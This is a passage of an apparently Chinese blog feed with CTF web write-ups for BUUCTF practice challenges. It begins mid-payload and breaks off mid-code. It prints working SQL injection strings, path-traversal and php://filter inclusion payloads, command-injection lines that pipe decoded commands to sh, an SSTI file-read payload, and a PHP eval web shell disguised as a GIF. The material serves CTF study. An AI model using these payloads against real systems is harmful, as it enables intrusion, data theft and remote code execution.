<span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/this_is_the_fl&#x27;</span>+<span class="hljs-string">&#x27;ag.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_web_第一页wp分享</title>
    <link href="https://d3n13d.github.io/2022/01/12/BUUCTF-web-%E7%AC%AC%E4%B8%80%E9%A1%B5wp%E5%88%86%E4%BA%AB/"/>
    <id>https://d3n13d.github.io/2022/01/12/BUUCTF-web-%E7%AC%AC%E4%B8%80%E9%A1%B5wp%E5%88%86%E4%BA%AB/</id>
    <published>2022-01-12T08:42:42.000Z</published>
    <updated>2022-02-10T15:02:54.791Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BUUCTF-web-第一页wp分享"><a href="#BUUCTF-web-第一页wp分享" class="headerlink" title="BUUCTF_web_第一页wp分享"></a>BUUCTF_web_第一页wp分享</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码直接出</p><figure class="highlight ada"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>重点：include 对 ‘&#x2F;‘的处理</p><p>根据注释拿到php源码,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>) //安全函数 检查是否在白名单里</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) &#123; <span class="hljs-comment">//page参数str类型</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br><span class="hljs-comment">//            demo:$page=&#x27;http://www.baidu.com/123/456/../../../../?source.php&amp;b=1&#x27;</span><br>            <span class="hljs-comment">//结果&quot;http://www.baidu.com/123/456/../../../../&quot;</span><br>            <span class="hljs-comment">//可以看到实际上完成了去除传参的工作 下面同理</span><br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>); <span class="hljs-comment">//一次url解码</span><br>            <span class="hljs-variable">$_page</span> = mb_substr(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现存在hint.php</p><p>提示我们 flag在 &#x2F;ffffllllaaaagggg </p><p>那么我们不难发现 如果想要文件包含 必须要一次url解密 三次白名单验证 两次取路径（就是不管后面参数）</p><p>哎？那这个时候我们多打几个问号能不能绕过呢？ 答案是不行的，因为strpos取的是问号第一次出现的位置</p><p>所以其实多处理那几次区别不大 我们肯定是希望会在最后返回 true 然后 文件包含 $file</p><p>这种时候其实可以试试路径穿越，返回true即可</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072224540.png" alt="image-20220107222434456"></p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=hint.php?<br></code></pre></td></tr></table></figure><p>这样就可以过这个判断</p><p>结合路径穿越，构造</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=hint.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg <br></code></pre></td></tr></table></figure><p>为什么这样写？对于include 如果后面的内容带 ‘&#x2F;‘ 会被识别为目录 那么最后会包含最后的内容 ..&#x2F;作为目录穿越</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看源码得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cat</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cat</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cat</span>==<span class="hljs-string">&#x27;dog&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>显然flag不是Syc{cat_cat_cat_cat} 但是告诉你获取flag方式了</p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?cat=dog<br></code></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>就是骗了一下吧</p><p>其实就是大概这样的写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;5a15074c-0bd0-473e-bf9d-516544448c9a&#125;</span><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf8&quot;</span>&gt;<br>Can you find out the flag?<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>常规下php代码不可视，所以用伪协议读取即可</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span><span class="hljs-keyword">read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>经典老题</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072253903.png" alt="image-20220107225301830"></p><p>利用堆叠注入获取所有表</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072253353.png" alt="image-20220107225349306"></p><p>发现 1919810931114514 这个表里有 flag字段</p><p>之后发现过滤了select 等字段 那其实合成一下就行</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?inject=<span class="hljs-number">1&#x27;</span>;<span class="hljs-function">PREPARE hacker <span class="hljs-keyword">from</span> <span class="hljs-title">concat</span>(<span class="hljs-params"><span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>, <span class="hljs-string">&#x27; * from `1919810931114514` &#x27;</span></span>)</span>;EXECUTE hacker;<span class="hljs-meta">#</span><br><span class="hljs-function">PREPARE hacker <span class="hljs-keyword">from</span> <span class="hljs-title">concat</span>(<span class="hljs-params"><span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;esc&#x27;</span>,<span class="hljs-string">&#x27;Flag&#x27;</span></span>)</span>;EXECUTE hacker;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201080015265.png" alt="image-20220108001548214"></p><p>经过测试发现可以 堆叠注入 <code>1;show databases;#</code></p><p>有表</p><blockquote><p>ctftraining</p><p>ctf</p><p>information_schema</p><p>mysql</p><p>performance_schema</p><p>test</p></blockquote><p>剩下的就不会了</p><p>非预期  *,1</p><p>预期解 </p><p>1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p><div class="code-wrapper"><pre><code class="hljs">在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能。这里可以理解为 sql 在遇到 1||(0/1) 时 只运行前一个 所以无法查询第二个操作数</code></pre></div><p>mysql逻辑运算 <a href="https://www.runoob.com/mysql/mysql-operator.html">https://www.runoob.com/mysql/mysql-operator.html</a></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>太基础了 不想写 127.0.0.1 | cat &#x2F;flag</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201080022247.png" alt="image-20220108002235193"></p><h2 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="[极客大挑战 2019]Secret"></a>[极客大挑战 2019]Secret</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081540389.png" alt="image-20220108154009276"></p><p>一开始以为是http跳转 然后发现这个地方有个a 标签跳转到 .&#x2F;Archive_room.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081542857.png" alt="image-20220108154203809"></p><p>之后又发现了secret.php</p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||stristr(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里</span><br><span class="hljs-meta">?&gt;</span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>尝试直接包含flag.php但是文件内容不可见 那么就可以用php为协议读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">?file=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>直接万能密码 1’ or 1&#x3D;1# 得到admin密码a6459693046ee8280c4a2b5a9625bc45 正好32位我尝试 8-4-4-4-12直接交flag但实际不是</p><p>之后发现我们可以继续注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">check.php?username=admin1&#x27; union select 1,version(),database()%23&amp;password=a6459693046ee8280c4a2b5a9625bc45<br></code></pre></td></tr></table></figure><p>版本：10.3.18-MariaDB</p><p>数据库：geek</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">check.php?username=admin1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;geek&#x27;%23&amp;password=a6459693046ee8280c4a2b5a9625bc45<br></code></pre></td></tr></table></figure><p>geekuser,l0ve1ysq1</p><p>数据库geek 俩表 geekuser,l0ve1ysq1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> from information_schema.columns where table_name=&#x27;l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">23</span>&amp;password=a<span class="hljs-number">6459693046</span>ee<span class="hljs-number">8280</span>c<span class="hljs-number">4</span>a<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-number">9625</span>bc<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><p>三个字段id,username,password</p><p>最终payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(id,username,password),<span class="hljs-number">3</span> from l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span>%<span class="hljs-number">23</span>&amp;password=a<span class="hljs-number">6459693046</span>ee<span class="hljs-number">8280</span>c<span class="hljs-number">4</span>a<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-number">9625</span>bc<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>直接构造，三者都行</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">ip=127.0.0.1|echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-<span class="hljs-keyword">d</span>|<span class="hljs-keyword">sh</span><br>?ip=127.0.0.1;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>`<span class="hljs-keyword">ls</span>`<br>?ip=127.0.0.1;a=<span class="hljs-keyword">g</span>;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>蚁剑直接连</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082158823.png" alt="image-20220108215810763"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>无法直接访问网页</p><p>这里选择了 curl</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082205781.png" alt="image-20220108220545599"></p><p>发现了 Secret.php</p><p>构建数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Secret.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.buuoj.cn:26189<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Syclover<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br>Referer:https://Sycsecret.buuoj.cn<br>X-Forwarded-For:127.0.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>构建马子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082219255.png" alt="image-20220108221915179"></p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>和上面一题一样，不赘述</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082222743.png" alt="image-20220108222232683"></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>整挺好</p><p>考点：无参数RCE，php特性</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091610973.png" alt="image-20220109161023880"></p><p>首先是这个页面以为可以直接执行命令但是实际上并没有，然后看源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;<br>  &lt;title&gt;简单的计算器&lt;/title&gt;<br>  <br>  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br>  &lt;link rel=&quot;stylesheet&quot; href=&quot;./libs/bootstrap.min.css&quot;&gt;<br>  &lt;script src=&quot;./libs/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;<br>  &lt;script src=&quot;./libs/bootstrap.min.js&quot;&gt;&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;div class=&quot;container text-center&quot; style=&quot;margin-top:30px;&quot;&gt;<br>  &lt;h2&gt;表达式&lt;/h2&gt;<br>  &lt;form id=&quot;calc&quot;&gt;<br>    &lt;div class=&quot;form-group&quot;&gt;<br>      &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;content&quot; placeholder=&quot;输入计算式&quot; data-com.agilebits.onepassword.user-edited=&quot;yes&quot;&gt;<br>    &lt;/div&gt;<br>    &lt;div id=&quot;result&quot;&gt;&lt;div class=&quot;alert alert-success&quot;&gt;<br>            &lt;/div&gt;&lt;/div&gt;<br>    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;计算&lt;/button&gt;<br>  &lt;/form&gt;<br>&lt;/div&gt;<br>&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;<br>&lt;script&gt;<br>    $(&#x27;#calc&#x27;).submit(function()&#123;<br>        $.ajax(&#123;<br>            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),<br>            type:&#x27;GET&#x27;,<br>            success:function(data)&#123;<br>                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;<br>            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;<br>            &lt;/div&gt;`);<br>            &#125;,<br>            error:function()&#123;<br>                alert(&quot;这啥?算不来!&quot;);<br>            &#125;<br>        &#125;)<br>        return false;<br>    &#125;)<br>&lt;/script&gt;<br><br>&lt;/body&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>发现了calc.php这个页面 这个地方也是用ajax和calc页面进行数据传输，前往calc.php 获得代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to 